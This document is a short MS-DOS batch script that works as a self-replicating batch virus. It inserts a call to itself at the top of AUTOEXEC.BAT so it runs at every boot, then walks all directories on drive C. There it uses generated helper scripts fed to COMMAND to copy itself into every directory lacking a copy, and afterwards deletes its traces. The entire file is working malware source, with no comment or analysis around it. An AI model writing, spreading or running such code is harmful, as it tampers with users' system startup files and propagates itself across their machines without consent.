@echo off
@rem
@set inf=n
@rem
@set infe=n
@rem
@if %INF%==Y goto scanne
@rem
@echo @SET INF=Y >b.222
@rem
@echo @call %0.bat >>b.222
@rem
@echo @echo !>>b.222
@rem
@TYPE AUTOEXEC.BAT >>b.222
@rem
@COPY b.222 AUTOEXEC.BAT >NUL
@rem
@SET INF=Y
@rem
:scanne
@IF %infe%==Y GOTO END
@rem
@c:
@rem
@cd\
@rem
@dir %0.bat /s | find /i "Dire" >c:\b.222
@rem
@echo exit >>c:\b.222
@echo @copy %%2\%0.bat c:\ >c:\dire.bat
@rem
@command <c:\b.222 >nul
@rem
@c:
@cd\
@dir /ad /s|find /i "Dire" >b.222
@rem
@echo exit >> b.222
@rem
@echo @if not exist %%2%0.bat copy c:\%0.bat %%2 >c:\dire.bat
@rem
@command < b.222 > nul
@rem
@del b.222
@rem
@del dire.bat
@del %0.bat
@rem
@SET infe=Y
:END
@echo !!
@rem